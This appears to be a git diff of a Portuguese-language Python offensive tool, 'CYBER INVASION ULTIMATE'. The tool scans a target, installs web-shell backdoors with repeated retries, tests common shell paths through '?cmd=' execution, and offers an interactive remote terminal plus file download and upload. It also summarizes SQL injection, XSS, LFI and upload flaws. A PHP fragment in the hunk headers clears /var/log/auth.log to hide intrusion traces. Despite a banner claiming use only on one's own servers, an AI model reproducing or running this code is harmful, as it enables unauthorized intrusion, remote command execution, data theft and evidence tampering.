+                        headers={"User-Agent": "Mozilla/5.0"}
+                    )
+                    response = urllib.request.urlopen(req, timeout=3)
+                except:
+                    pass
+            
+            # Mostra progresso a cada 10 tentativas
+            if tentativa % 10 == 0:
+                print(f"  {YELLOW}[!] Tentativa {tentativa}: Nenhum sucesso ainda... continuando...{RESET}")
+                time.sleep(0.5)
+            
+            # Pequena pausa para não sobrecarregar
+            time.sleep(0.1)
+        
+        return False
+    
+    # ==========================================
+    # TESTA BACKDOOR
+    # ==========================================
+    
+    def _testar_backdoor(self):
+        """Testa se o backdoor foi instalado em QUALQUER lugar"""
+        urls = [
+            f"http://{self.target}:{self.port}/uploads/shell.php",
+            f"http://{self.target}:{self.port}/shell.php",
+            f"http://{self.target}:{self.port}/backdoor.php",
+            f"http://{self.target}:{self.port}/cmd.php",
+            f"http://{self.target}:{self.port}/admin.php",
+            f"http://{self.target}:{self.port}/x.php",
+            f"http://{self.target}:{self.port}/test.php",
+            f"http://{self.target}:{self.port}/1.php",
+            f"http://{self.target}:{self.port}/a.php",
+            f"http://{self.target}:{self.port}/system.php",
+            f"http://{self.target}:{self.port}/exec.php",
+            f"http://{self.target}:{self.port}/shell2.php"
+        ]
+        
+        for url in urls:
+            try:
+                req = urllib.request.Request(
+                    f"{url}?cmd=echo%20'OK'",
+                    headers={"User-Agent": "Mozilla/5.0"}
+                )
+                response = urllib.request.urlopen(req, timeout=3)
+                
+                if response.getcode() == 200:
+                    html = response.read().decode('utf-8', errors='ignore')
+                    if "OK" in html or "cmd" in html or "system" in html:
+                        self.backdoor_url = url
+                        self.backdoor_instalado = True
+                        print(f"\n{GREEN}╔{'═' * (LARGURA - 2)}╗{RESET}")
+                        print(f"{GREEN}║     ✅ BACKDOOR INSTALADO!      ║{RESET}")
+                        print(f"{GREEN}║     📍 {url[:40]}║{RESET}")
+                        print(f"{GREEN}╚{'═' * (LARGURA - 2)}╝{RESET}")
+                        return True
+            except:
+                continue
+        
+        return False
+    
+    # ==========================================
+    # EXECUTAR COMANDO
     # ==========================================
     
     def executar_comando(self, comando):
@@ -994,7 +789,7 @@ if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var
             return f"Erro: {str(e)}"
     
     # ==========================================
-    # 13. BAIXAR ARQUIVO
+    # BAIXAR ARQUIVO
     # ==========================================
     
     def baixar_arquivo(self, arquivo):
@@ -1022,7 +817,7 @@ if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var
             return False
     
     # ==========================================
-    # 14. ENVIAR ARQUIVO
+    # ENVIAR ARQUIVO
     # ==========================================
     
     def enviar_arquivo(self, local, remoto):
@@ -1057,22 +852,20 @@ if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var
             return False
     
     # ==========================================
-    # 15. TERMINAL INTERATIVO
+    # TERMINAL INTERATIVO
     # ==========================================
     
     def terminal_interativo(self):
-        """Terminal interativo completo"""
+        """Terminal interativo"""
         if not self.backdoor_instalado:
             print(f"\n{RED}[!] Backdoor nao instalado!{RESET}")
             return
         
         print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
-        print(f"{PURPLE}║     ⚡ TERMINAL INTERATIVO        ║{RESET}")
+        print(f"{PURPLE}║     ⚡ TERMINAL INTERATIVO      ║{RESET}")
         print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
         print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (23 - len(str(self.port))) }║{RESET}")
-        print(f"{PURPLE}║ Comandos: whoami, ls, pwd, cat   ║{RESET}")
-        print(f"{PURPLE}║          download, upload, clean ║{RESET}")
-        print(f"{PURPLE}║ Digite 'exit' para sair          ║{RESET}")
+        print(f"{PURPLE}║ Digite 'exit' para sair         ║{RESET}")
         print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
         
         while True:
@@ -1100,100 +893,55 @@ if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var
             print(f"{WHITE}{resultado}{RESET}")
     
     # ==========================================
-    # 16. MOSTRA RESULTADOS COMPLETOS
+    # MOSTRA RESULTADOS
     # ==========================================
     
     def mostrar_resultados(self):
-        """Mostra todos os resultados encontrados"""
+        """Mostra resultados do scan"""
         print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
-        print(f"{PURPLE}║     📊 RELATORIO COMPLETO        ║{RESET}")
+        print(f"{PURPLE}║     📊 RESULTADOS ENCONTRADOS  ║{RESET}")
         print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
-        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (25 - len(str(self.port))) }║{RESET}")
-        print(f"{PURPLE}║ Data: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M')}{' ' * (18) }║{RESET}")
+        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (21 - len(str(self.port))) }║{RESET}")
         print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
         
-        # ==========================================
-        # PORTAS ABERTAS
-        # ==========================================
+        # Portas
         if self.portas_abertas:
             print(f"\n{CYAN}┌─ PORTAS ABERTAS ({len(self.portas_abertas)}){RESET}")
-            for porta in self.portas_abertas:
+            for porta in self.portas_abertas[:10]:
                 print(f"  {GREEN}[+] {porta['porta']} - {porta['servico']}{RESET}")
-        
-        # ==========================================
-        # SUBDOMÍNIOS
-        # ==========================================
-        if self.subdominios:
-            print(f"\n{CYAN}┌─ SUBDOMÍNIOS ({len(self.subdominios)}){RESET}")
-            for sub in self.subdominios[:10]:
-                print(f"  {GREEN}[+] {sub['subdominio']} -> {sub['ip']}{RESET}")
-        
-        # ==========================================
-        # DIRETÓRIOS
-        # ==========================================
-        if self.diretorios:
-            print(f"\n{CYAN}┌─ DIRETÓRIOS ({len(self.diretorios)}){RESET}")
-            for diretorio in self.diretorios[:10]:
-                print(f"  {GREEN}[+] {diretorio}{RESET}")
-        
-        # ==========================================
-        # VULNERABILIDADES
-        # ==========================================
-        print(f"\n{CYAN}┌─ VULNERABILIDADES ENCONTRADAS{RESET}")
         
         # SQL Injection
         if self.vulnerabilidades.get('sql_injection'):
-            print(f"  {RED}🔥 SQL Injection: {len(self.vulnerabilidades['sql_injection'])} encontradas{RESET}")
+            print(f"\n{RED}┌─ SQL INJECTION ({len(self.vulnerabilidades['sql_injection'])}){RESET}")
             for vuln in self.vulnerabilidades['sql_injection'][:5]:
-                print(f"     {vuln['endpoint']} -> {vuln['payload']}")
+                print(f"  {RED}[!] {vuln['endpoint']} -> {vuln['payload']}{RESET}")
         
         # XSS
         if self.vulnerabilidades.get('xss'):
-            print(f"  {RED}🔥 XSS: {len(self.vulnerabilidades['xss'])} encontrados{RESET}")
+            print(f"\n{RED}┌─ XSS ({len(self.vulnerabilidades['xss'])}){RESET}")
             for vuln in self.vulnerabilidades['xss'][:5]:
-                print(f"     {vuln['endpoint']} -> {vuln['payload'][:30]}...")
+                print(f"  {RED}[!] {vuln['endpoint']} -> {vuln['payload'][:30]}...{RESET}")
         
         # LFI
         if self.vulnerabilidades.get('lfi'):
-            print(f"  {RED}🔥 LFI: {len(self.vulnerabilidades['lfi'])} encontrados{RESET}")
+            print(f"\n{RED}┌─ LFI ({len(self.vulnerabilidades['lfi'])}){RESET}")
             for vuln in self.vulnerabilidades['lfi'][:5]:
-                print(f"     {vuln['endpoint']} -> {vuln['payload']}")
-        
-        # RFI
-        if self.vulnerabilidades.get('rfi'):
-            print(f"  {RED}🔥 RFI: {len(self.vulnerabilidades['rfi'])} encontrados{RESET}")
-            for vuln in self.vulnerabilidades['rfi'][:5]:
-                print(f"     {vuln['endpoint']} -> {vuln['payload']}")
+                print(f"  {RED}[!] {vuln['endpoint']} -> {vuln['payload']}{RESET}")
         
         # Upload
         if self.vulnerabilidades.get('upload'):
-            print(f"  {RED}🔥 Upload Vulneravel: {len(self.vulnerabilidades['upload'])} encontrados{RESET}")
+            print(f"\n{RED}┌─ UPLOAD ({len(self.vulnerabilidades['upload'])}){RESET}")
             for upload in self.vulnerabilidades['upload'][:5]:
-                print(f"     {upload}")
+                print(f"  {RED}[!] {upload}{RESET}")
         
-        # ==========================================
-        # USUÁRIOS
-        # ==========================================
-        if self.usuarios:
-            print(f"\n{CYAN}┌─ USUÁRIOS DO SISTEMA ({len(self.usuarios)}){RESET}")
-            for user in self.usuarios[:10]:
-                print(f"  {GREEN}[+] {user}{RESET}")
-        
-        # ==========================================
-        # BACKDOOR
-        # ==========================================
+        # Backdoor
         if self.backdoor_instalado:
-            print(f"\n{CYAN}┌─ BACKDOOR INSTALADO{RESET}")
+            print(f"\n{GREEN}┌─ BACKDOOR INSTALADO{RESET}")
             print(f"  {GREEN}[+] URL: {self.backdoor_url}{RESET}")
-            print(f"  {GREEN}[+] Exemplo: {self.backdoor_url}?cmd=whoami{RESET}")
+            print(f"  {GREEN}[+] Tentativas: {self.tentativas}{RESET}")
         else:
-            print(f"\n{CYAN}┌─ BACKDOOR{RESET}")
-            print(f"  {YELLOW}[!] Backdoor nao instalado{RESET}")
-            print(f"  {YELLOW}[!] Use a opcao [1] para instalar{RESET}")
-        
-        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
-        print(f"{PURPLE}║     ✅ SCAN ULTIMATE CONCLUIDO!   ║{RESET}")
-        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
+            print(f"\n{YELLOW}┌─ BACKDOOR{RESET}")
+            print(f"  {YELLOW}[!] Nao instalado - Use opcao [1]{RESET}")
 
 
 # ==========================================
@@ -1209,7 +957,7 @@ def cyber_invasion():
     print("║    🚀 CYBER INVASION ULTIMATE         ║")
     print("╠══════════════════════════════════════════╣")
     print("║  SCAN COMPLETO EM TODOS OS ASPECTOS    ║")
-    print("║  ENCONTRA TODAS AS VULNERABILIDADES   ║")
+    print("║  BACKDOOR TENTA ATE CONSEGUIR!        ║")
     print("║  APENAS EM SERVIDORES PROPIOS!        ║")
     print("╚══════════════════════════════════════════╝")
     
@@ -1272,22 +1020,22 @@ def cyber_invasion():
     invasor.mostrar_resultados()
     
     # ==========================================
-    # MENU DE OPCOES POS-INVASAO
+    # MENU DE OPCOES
     # ==========================================
     
     while True:
         print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
-        print(f"{PURPLE}║    🎯 MENU DE CONTROLE           ║{RESET}")
+        print(f"{PURPLE}║    🎯 MENU DE CONTROLE         ║{RESET}")
         print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
         
         if invasor.backdoor_instalado:
-            print(f"{GREEN}║ ✅ Backdoor: INSTALADO           ║{RESET}")
+            print(f"{GREEN}║ ✅ Backdoor: INSTALADO         ║{RESET}")
             print(f"{GREEN}║ 📍 {invasor.backdoor_url[:35]}{' ' * (10) }║{RESET}")
         else:
-            print(f"{RED}║ ❌ Backdoor: NAO INSTALADO       ║{RESET}")
+            print(f"{RED}║ ❌ Backdoor: NAO INSTALADO     ║{RESET}")
         
         print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
-        print(f"{PURPLE}║ [1] Instalar Backdoor            ║{RESET}")
+        print(f"{PURPLE}║ [1] Instalar Backdoor (INFINITO)║{RESET}")
         print(f"{PURPLE}║ [2] Terminal Interativo          ║{RESET}")
         print(f"{PURPLE}║ [3] Executar Comando             ║{RESET}")
         print(f"{PURPLE}║ [4] Baixar Arquivo               ║{RESET}")
@@ -1300,12 +1048,11 @@ def cyber_invasion():
         sub_opcao = input(f"\n{RED}cyber@{alvo}>{RESET} ").strip()
         
         if sub_opcao == "1":
+            print(f"\n{YELLOW}[!] Iniciando instalacao INFINITA...{RESET}")
+            print(f"{YELLOW}[!] Pressione Ctrl+C para parar{RESET}")
             invasor.instalar_backdoor()
             if invasor.backdoor_instalado:
-                print(f"\n{GREEN}[+] Backdoor instalado com sucesso!{RESET}")
-                print(f"{GREEN}[+] URL: {invasor.backdoor_url}{RESET}")
-            else:
-                print(f"\n{RED}[-] Falha ao instalar backdoor{RESET}")
+                print(f"\n{GREEN}[+] Backdoor instalado! {invasor.tentativas} tentativas{RESET}")
             input("\nENTER para continuar...")
         
         elif sub_opcao == "2":
